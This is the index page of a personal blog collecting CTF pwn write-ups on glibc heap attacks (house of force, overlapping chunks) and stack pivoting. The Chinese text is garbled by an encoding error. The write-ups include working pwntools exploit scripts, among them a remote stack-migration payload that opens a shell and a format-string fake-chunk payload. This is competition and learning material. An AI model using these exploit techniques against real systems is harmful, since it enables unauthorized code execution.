


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<title> [ your blog title ]</title>
	
	
	<!-- stylesheets list from _config.yml -->
	
	<link rel="stylesheet" href="/css/PreciousJoy.css">
	
	<link rel="stylesheet" href="/css/top-bar.css">
	
	<link rel="stylesheet" href="/css/menu-outer.css">
	
	<link rel="stylesheet" href="/css/content-outer.css">
	
	<link rel="stylesheet" href="/css/bottom-outer.css">
	
	<link rel="stylesheet" href="/css/atom-one-dark.css">
	
	<link rel="stylesheet" href="/css/recent-posts-item.css">
	
	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
	
	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
	
	<link rel="stylesheet" href="/css/search.css">
	
	<link rel="stylesheet" href="/css/toc.css">
	
	<link rel="stylesheet" href="/css/sidebar.css">
	
	<link rel="stylesheet" href="/css/archive.css">
	
	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
	
	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
	
	
	
<meta name="generator" content="Hexo 6.3.0"></head>




<body id="wrapper">

	<div id="">
		
		<div id="top-bar">
			
			<div id="avatar-box">
				<img 
				class="avatar"
				src="/images/default-avatar.jpg" 
				alt="avatar">
			</div>

			<div id="top-bar-text">
				<div id="top-bar-title">
					pa1n
				</div>
				<div id="top-bar-slogan">
					
				</div>
			</div>

		</div>

		<div id="menu-outer">
			<div id="menu-inner">
				
				
				<div class="menu-item">
					<a href="/">Home</a>
				</div>
				
				<div class="menu-item">
					<a href="/about">About</a>
				</div>
				
				<div class="menu-item">
					<a href="/archives">Archives</a>
				</div>
				

				<div class="menu-item menu-item-search">
					
  <span class="local-search local-search-google local-search-plugin">
      <input type="search" placeholder="ç«™å†…æœç´¢" id="local-search-input" class="local-search-input-cls" style="">
      <div id="local-search-result" class="local-search-result-cls"></div>
  </span>
	
				</div>

			</div>
		</div>

		<div id="content-outer">
			<div id="content-inner">

				

<div id="recent-posts-box">

  
  <div id="recent-posts">
    <!-- <h1>Recent Posts</h1> -->
    
    
    <div class="recent-post-item">

      <a href="/2024/11/03/house-of-force/" class="item-title">200~house_of_force</a>
      
      <time datetime="2024-11-03T10:14:32.000Z">
        2024-11-03
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- åˆ©ç”¨æ¡ä»¶ï¼šèƒ½æ§åˆ¶topchunk_sizeï¼Œèƒ½å¤Ÿè‡ªç”±æ§åˆ¶ç”³è¯·çš„å †å—å¤§å°ã€‚éœ€è¦çŸ¥é“top_chunkåœ°å€ä¸ç›®çš„åœ°å€çš„åç§»é‡ï¼Œå¦‚æœè¿˜ä¸å¯¹é½ï¼Œå³ç»“æœä¸æ˜¯0x0ç»“å°¾ï¼Œéœ€è¦å¤šå‡8ï¼Œç„¶åå‡å»SIZE_SZï¼ˆ8ï¼‰
ç»“æœï¼šèƒ½å°†topcunkçš„åœ°å€æ§åˆ¶åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œå†ç”³è¯·å†…å­˜å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€çš„å€¼ã€‚
check1å¯¹topchunk_sizeçš„æ£€æŸ¥ï¼Œ(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)
// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°
victim = av-&gt;top;
size   = chunksize(victim);
// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
&#123;
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, n -->
        <!-- </div> -->

        
        <p>åˆ©ç”¨æ¡ä»¶ï¼šèƒ½æ§åˆ¶topchunk_sizeï¼Œèƒ½å¤Ÿè‡ªç”±æ§åˆ¶ç”³è¯·çš„å †å—å¤§å°ã€‚éœ€è¦çŸ¥é“top_chunkåœ°å€ä¸ç›®çš„åœ°å€çš„åç§»é‡ï¼Œå¦‚æœè¿˜ä¸å¯¹é½ï¼Œå³ç»“æœä¸æ˜¯0x0ç»“å°¾ï¼Œéœ€è¦å¤šå‡8ï¼Œç„¶åå‡å»SIZE_SZï¼ˆ8ï¼‰</p>
<p>ç»“æœï¼šèƒ½å°†topcunkçš„åœ°å€æ§åˆ¶åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œå†ç”³è¯·å†…å­˜å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€çš„å€¼ã€‚</p>
<h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>å¯¹topchunk_sizeçš„æ£€æŸ¥ï¼Œ(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p>
<pre><code class="lang-c++">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°
victim = av-&gt;top;
size   = chunksize(victim);
// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
&#123;
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&gt;top        = remainder;
    #è®¾ç½®top_chunkçš„å¤´ï¼Œé™„è¿‘å€¼ä¼šæœ‰æ‰€å˜åŒ–
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
&#125;
</code></pre>
<p>æ‰€ä»¥æŠŠsizeæ”¹ä¸º-1ï¼Œåœ¨è¡¥ç ä¸­ä¸ºå¾ˆå¤§çš„æ•°ï¼Œèƒ½å¤Ÿæ»¡è¶³æ¡ä»¶</p>
<h5 id="æ–°çš„remainderå³top-chunkçš„åœ°å€-remainder-chunk-at-offset-victim-nb-ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»"><a href="#æ–°çš„remainderå³top-chunkçš„åœ°å€-remainder-chunk-at-offset-victim-nb-ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»" class="headerlink" title="æ–°çš„remainderå³top_chunkçš„åœ°å€  **remainder = chunk_at_offset(victim, nb);**ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»"></a>æ–°çš„remainderå³top_chunkçš„åœ°å€  <code>**remainder = chunk_at_offset(victim, nb);**</code>ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>å¯¹ç”³è¯·çš„sizeçš„æ£€æŸ¥</p>
<pre><code class="lang-c++">/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#è¿™é‡Œçš„reqå³æ˜¯nb.å¯¹reqçš„å¤§å°çš„æ£€æŸ¥ï¼Œ((unsigned long) (req)è¦å°äº (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1

# å¯¹nbåŠ  SIZE_SZåŠ  MALLOC_ALIGN_MASK,æœ€åå’ŒMALLOC_ALIGN_MASKæŒ‰ä½ä¸å¯¹é½,è¿™é‡Œçš„SIZE_SZæ˜¯8
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */
# reqä¸èƒ½å¤§äº -2 * MINSIZEï¼Œå¦åˆ™ä¼šæŠ¥é”™
#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    &#125;                                                                          \
    (sz) = request2size(req);
</code></pre>
<h5 id="é¦–å…ˆ-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„-2-MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE-ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚"><a href="#é¦–å…ˆ-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„-2-MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE-ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚" class="headerlink" title="é¦–å…ˆ  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„  **-2  MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE*ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚"></a>é¦–å…ˆ  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„  **-2 </em> MINSIZE<strong>ï¼Œå³reqä¸èƒ½å¤§äº</strong>-2<em>MINSIZE*</em>ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚</h5><h5 id="å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8"><a href="#å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8" class="headerlink" title="å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8"></a>å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº-req-SIZE-SZï¼ŒSIZE-SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC-ALIGN-MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC-ALIGN-MASKäº†"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº-req-SIZE-SZï¼ŒSIZE-SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC-ALIGN-MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC-ALIGN-MASKäº†" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº(req) + SIZE_SZï¼ŒSIZE_SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC_ALIGN_MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC_ALIGN_MASKäº†"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº(req) + SIZE_SZï¼ŒSIZE_SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC_ALIGN_MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC_ALIGN_MASKäº†</h5><p><code>MALLOC_ALIGN</code> é€šå¸¸æŒ‡çš„æ˜¯å†…å­˜å—å¯¹é½çš„è¦æ±‚ã€‚å¦‚æœreqä¸å¯¹é½ï¼Œä¸æ˜¯0x0ç»“å°¾çš„ï¼Œéœ€è¦å¤šå‡æ‰8</p>
<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>åªå¼€äº†æ ˆä¸Šçš„ä¿æŠ¤</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p>
<p>è¿™é‡Œä¼šæŠŠå †çš„åœ°å€ç»™åˆ°v2çš„æŒ‡é’ˆï¼Œåç»­ä¼šæ‰“å°å‡ºæ¥</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p>
<p>ğŸ•â…§é¢˜ç›®ï¼Œè°ƒè¯•çš„æ—¶å€™å®Œå…¨ä¸æ˜¯é¢˜ç›®é€»è¾‘ï¼Œç®—äº†ã€‚</p>

        


        <span>
          <a class="article-read" href="/2024/11/03/house-of-force/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/10/29/pwn2%20short/" class="item-title"></a>
      
      <time datetime="2024-10-29T09:09:11.391Z">
        2024-10-29
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- pwn2 shortå¾ˆç®€å•çš„32ä½æ ˆè¿ç§»ï¼Œè¿˜ç•™äº†ä¸ªåé—¨
è¿™é‡Œè·å¾—æ ˆåœ°å€

æŠŠbin/shçš„åœ°å€æ”¾è¿”å›åœ°å€åé¢å°±ok
from pwn import*
from LibcSearcher import *
p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)
#p=process(&quot;./short&quot;)
context.log_level=&quot;debug&quot;

p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)
p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)
p.recvuntil(&#39;0x&#39;)
stack=int(p.recv(8),16)
print(hex(stack))
pop_edi=0x0804884a
pop_ebx=0x08048411
gift=0x080485E6
leave=0x08048674 -->
        <!-- </div> -->

        
        <h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>å¾ˆç®€å•çš„32ä½æ ˆè¿ç§»ï¼Œè¿˜ç•™äº†ä¸ªåé—¨</p>
<p>è¿™é‡Œè·å¾—æ ˆåœ°å€</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p>
<p>æŠŠbin/shçš„åœ°å€æ”¾è¿”å›åœ°å€åé¢å°±ok</p>
<pre><code class="lang-py">from pwn import*
from LibcSearcher import *
p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)
#p=process(&quot;./short&quot;)
context.log_level=&quot;debug&quot;

p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)
p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)
p.recvuntil(&#39;0x&#39;)
stack=int(p.recv(8),16)
print(hex(stack))
pop_edi=0x0804884a
pop_ebx=0x08048411
gift=0x080485E6
leave=0x08048674
binsh=0x0804A038 
payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)


#gdb.attach(p)
sleep(1)
p.sendlineafter(&quot;msg:&quot;,payload)

p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/10/29/pwn2 short/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/10/21/overlapping_chunks/" class="item-title">overlapping_chunks</a>
      
      <time datetime="2024-10-21T12:11:58.000Z">
        2024-10-21
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- å¤§å¤šéƒ½æ˜¯å †æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œchunké‡Šæ”¾å‰æˆ–é‡Šæ”¾åæ”¹å˜sizeçš„å€¼ï¼Œå†ç”³è¯·çš„æ—¶å€™é€ æˆä¸¤ä¸ªå †å—æœ‰é‡åˆçš„åœ°æ–¹ï¼Œæœ‰æ—¶å€™éœ€è¦æ”¹å˜å¯¹åº”ä¸‹ä¸€ä¸ªå †çš„pre_sizeç»•è¿‡æ£€æŸ¥ï¼Œè™½è¯´åœ¨libc2.29ä»¥åæ‰å‡ºç°ï¼Œä½†æœ‰æ—¶å€™2.23çš„ç‰ˆæœ¬è¿˜æ˜¯ä¼šå› æ­¤è€ŒæŠ¥é”™ã€‚æ‰€ä»¥å°½å¯èƒ½çš„åœ¨ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½æ”¹æˆæˆ‘ä»¬çš„size.
/* consolidate backward */
    if (!prev_inuse(p)) &#123;
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr (&quot;corrupted size vs. prev_size while conso -->
        <!-- </div> -->

        
        <p>å¤§å¤šéƒ½æ˜¯å †æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œchunké‡Šæ”¾å‰æˆ–é‡Šæ”¾åæ”¹å˜sizeçš„å€¼ï¼Œå†ç”³è¯·çš„æ—¶å€™é€ æˆä¸¤ä¸ªå †å—æœ‰é‡åˆçš„åœ°æ–¹ï¼Œæœ‰æ—¶å€™éœ€è¦æ”¹å˜å¯¹åº”ä¸‹ä¸€ä¸ªå †çš„pre_sizeç»•è¿‡æ£€æŸ¥ï¼Œè™½è¯´åœ¨libc2.29ä»¥åæ‰å‡ºç°ï¼Œä½†æœ‰æ—¶å€™2.23çš„ç‰ˆæœ¬è¿˜æ˜¯ä¼šå› æ­¤è€ŒæŠ¥é”™ã€‚æ‰€ä»¥å°½å¯èƒ½çš„åœ¨ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½æ”¹æˆæˆ‘ä»¬çš„size.</p>
<pre><code class="lang-c++">/* consolidate backward */
    if (!prev_inuse(p)) &#123;
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
      unlink_chunk (av, p);
    &#125;
</code></pre>
<h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>è¯¥ç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥çš„ 64 ä½ç¨‹åºï¼Œä¸»è¦å¼€å¯äº† Canary ä¸ NX ä¿æŠ¤.</p>
<p>ç¨‹åºçš„æœ€åæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨äºæ³„éœ²libcå’Œåœ¨finiçš„åœ°æ–¹å†™ä¸Šmainå‡½æ•°åœ°å€</p>
<p>è¿™é‡Œè¾“å…¥sæ˜¯èƒ½å†™ä¸Šæ ˆçš„åœ°æ–¹ï¼Œè¿™é‡Œè¾“å…¥finiçš„åœ°å€</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p>
<p>ç®—å‡ºåç§»æ˜¯13</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p>
<p>è¿™é‡Œåªå¼ºè°ƒæ„é€ çš„fake_chunk</p>
<pre><code class="lang-py">payload=b&#39;%2828c%13$hnkk%31$p&#39;
payload=payload.ljust(0x88,b&#39;b&#39;)
payload+=p64(0x151)
payload=payload.ljust(0x1d0,b&#39;\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31)
</code></pre>
<p>ç”³è¯·å †çš„è¿‡ç¨‹ä¸­æœ‰å †æº¢å‡ºå¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ª å †çš„sizeï¼Œæ”¹æˆä¸‹é¢ç‰¹æ®Šçš„å †çš„sizeï¼Œæ ¹æ®é¢˜ç›®ç»™å¤§å°æ”¹ã€‚</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>

        


        <span>
          <a class="article-read" href="/2024/10/21/overlapping_chunks/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/10/17/heapcreator/" class="item-title">heapcreator</a>
      
      <time datetime="2024-10-17T08:03:43.000Z">
        2024-10-17
      </time>
      
      <!-- <div class="article-digest"> -->
        <!--  -->
        <!-- </div> -->

        
        
        


        <span>
          <a class="article-read" href="/2024/10/17/heapcreator/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/09/21/stdout/" class="item-title">stdout</a>
      
      <time datetime="2024-09-21T14:44:34.000Z">
        2024-09-21
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- è¿™é‡Œstdoutç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0ï¼Œå°±æ˜¯æ ‡å‡†è¾“å‡ºå…¨ç¼“å†²ï¼Œç¼“å†²åŒºè¢«å¡«æ»¡æ‰èƒ½è¿›è¡Œå›æ˜¾
åˆ·æ–°ç¼“å†²åŒºæœ‰å‡ ç§åŠæ³•

èƒ½å¤Ÿæº¢å‡º8å­—èŠ‚

ä¸€ä¸ªæ²¡ä»€ä¹ˆç”¨çš„å‡½æ•°

é‚£ä¹ˆåªèƒ½å°†ç¼“å†²åŒºå¡«æ»¡ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯ç”¨vulnå‡½æ•°ä¸æ–­è¾“å…¥

retçš„æ“ä½œæ˜¯pop ripï¼Œrsp=rsp+8, æŒ‡å‘0x0x7fff153a5588.  endbr64æŒ‡ä»¤rspæ˜¯ä¸åŠ¨çš„ï¼Œpush rbpårbpå˜æˆäº†åŸæ¥è¿”å›åœ°å€çš„ä½ç½®,å†æ¬¡è°ƒç”¨ç›¸åŒçš„è¾“å…¥ä¹Ÿåªæ˜¯è®©rbp+8,å³æ¯æ¬¡
for i in range(20):
    payload=b&#39;c&#39;*0x28+p64(vul)
    p.send(payload)
    print(i)

ä¹Ÿåªæ˜¯è®©rbp+8ç§»åŠ¨

ç¬¬äºŒæ¬¡çš„rbp

åªæ˜¯è°ƒç”¨vulnçš„è¯æ—¶ä¸ä¼šå›æ˜¾çš„ã€‚

å…¶å®ä¸æ˜¯ç†æƒ³å½“ç„¶çš„å¡«å……ï¼Œå¾—è°ƒç”¨extendå‡½æ•°å¡«å……ç¼“å†²åŒºã€‚é‚£ä¹ˆå°±åªèƒ½ä¸æ–­è°ƒç”¨extendå‡½æ•°æŠŠç¼“å†²åŒºå¡«æ»¡ã€‚
è°ƒç”¨extendæ—¶ç¬¬äºŒåæ¬¡æ—¶çš„æ ˆ

exp
from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&qu -->
        <!-- </div> -->

        
        <p>è¿™é‡Œstdoutç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0ï¼Œå°±æ˜¯æ ‡å‡†è¾“å‡ºå…¨ç¼“å†²ï¼Œç¼“å†²åŒºè¢«å¡«æ»¡æ‰èƒ½è¿›è¡Œå›æ˜¾</p>
<p>åˆ·æ–°ç¼“å†²åŒºæœ‰å‡ ç§åŠæ³•</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p>
<p>èƒ½å¤Ÿæº¢å‡º8å­—èŠ‚</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p>
<p>ä¸€ä¸ªæ²¡ä»€ä¹ˆç”¨çš„å‡½æ•°</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p>
<p>é‚£ä¹ˆåªèƒ½å°†ç¼“å†²åŒºå¡«æ»¡ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯ç”¨vulnå‡½æ•°ä¸æ–­è¾“å…¥</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p>
<p>retçš„æ“ä½œæ˜¯pop ripï¼Œrsp=rsp+8, æŒ‡å‘0x0x7fff153a5588.  endbr64æŒ‡ä»¤rspæ˜¯ä¸åŠ¨çš„ï¼Œpush rbpårbpå˜æˆäº†åŸæ¥è¿”å›åœ°å€çš„ä½ç½®,å†æ¬¡è°ƒç”¨ç›¸åŒçš„è¾“å…¥ä¹Ÿåªæ˜¯è®©rbp+8,å³æ¯æ¬¡</p>
<pre><code class="lang-py">for i in range(20):
    payload=b&#39;c&#39;*0x28+p64(vul)
    p.send(payload)
    print(i)
</code></pre>
<p>ä¹Ÿåªæ˜¯è®©rbp+8ç§»åŠ¨</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p>
<p>ç¬¬äºŒæ¬¡çš„rbp</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p>
<p>åªæ˜¯è°ƒç”¨vulnçš„è¯æ—¶ä¸ä¼šå›æ˜¾çš„ã€‚</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p>
<p>å…¶å®ä¸æ˜¯ç†æƒ³å½“ç„¶çš„å¡«å……ï¼Œå¾—è°ƒç”¨extendå‡½æ•°å¡«å……ç¼“å†²åŒºã€‚é‚£ä¹ˆå°±åªèƒ½ä¸æ–­è°ƒç”¨extendå‡½æ•°æŠŠç¼“å†²åŒºå¡«æ»¡ã€‚</p>
<p>è°ƒç”¨extendæ—¶ç¬¬äºŒåæ¬¡æ—¶çš„æ ˆ</p>
<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p>
<p>exp</p>
<pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,)
p=process(&quot;./pwn&quot;)
context.log_level=&quot;debug&quot;
elf=ELF(&#39;./pwn&#39;)
libc=ELF(&#39;./libc-2.31.so&#39;)
extend=0x401287
vul=0x40125D
pop_rdi=0x4013d3
puts_got=elf.got[&#39;puts&#39;]
